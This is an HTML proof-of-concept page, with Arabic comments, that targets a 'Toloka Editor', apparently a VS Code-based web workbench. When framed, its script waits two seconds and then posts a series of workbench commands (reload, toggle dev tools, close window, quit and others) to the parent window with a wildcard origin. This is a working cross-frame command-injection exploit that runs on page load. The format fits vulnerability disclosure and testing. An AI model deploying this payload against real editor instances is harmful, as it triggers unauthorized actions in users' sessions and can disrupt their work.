<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Iframe PostMessage Exploit PoC</title>
  <style>
    body {
      font-family: sans-serif;
      background: #111;
      color: #0f0;
      text-align: center;
      margin-top: 50px;
    }
  </style>
</head>
<body>
  <h1>⚡ PoC: Toloka Editor iframe Exploit</h1>
  <p>يتم الآن إرسال مجموعة أوامر حساسة إلى النافذة الأم...</p>

  <script>
    const commands = [
      "workbench.action.reloadWindow",
      "workbench.action.toggleDevTools",
      "workbench.action.toggleFullScreen",
      "workbench.action.closeWindow",
      "workbench.action.quit",
      "workbench.action.showCommands",
      "workbench.action.toggleSidebarVisibility",
      "workbench.action.toggleZenMode"
    ];

    // إرسال كل الأوامر بعد انتظار النافذة الأم
    window.addEventListener("message", (event) => {
      console.log("📩 رسالة واردة من النافذة الأم:", event.data);
    });

    setTimeout(() => {
      for (const cmd of commands) {
        window.parent.postMessage({
          vscodeMessage: {
            command: cmd,
            arguments: []
          }
        }, "*");
        console.log("🚀 إرسال الأمر:", cmd);
      }
    }, 2000);
  </script>
</body>
</html>
